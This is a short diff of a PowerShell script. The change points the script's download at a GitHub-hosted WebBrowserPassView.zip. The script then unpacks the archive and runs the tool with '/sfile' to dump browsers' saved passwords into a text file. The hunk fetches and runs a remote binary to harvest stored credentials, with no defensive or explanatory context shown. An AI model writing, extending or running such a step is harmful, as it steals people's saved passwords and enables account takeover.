@@ -10,7 +10,7 @@ $params="/sfile $txtFile"
 
 
 Set-Location -path $runDirectory
-Invoke-WebRequest -Uri "blob:https://github.com/a1d34f05-95ff-428d-aac1-fe466bd113b3" -Method Get -OutFile $zipFolder
+Invoke-WebRequest -Uri "https://github.com/MaxAxoft/demo/raw/main/WebBrowserPassView.zip" -Method Get -OutFile $zipFolder
 Expand-Archive $zipFolder -DestinationPath $unzipFolder
 & "$exeFile" $params
 $txtFile
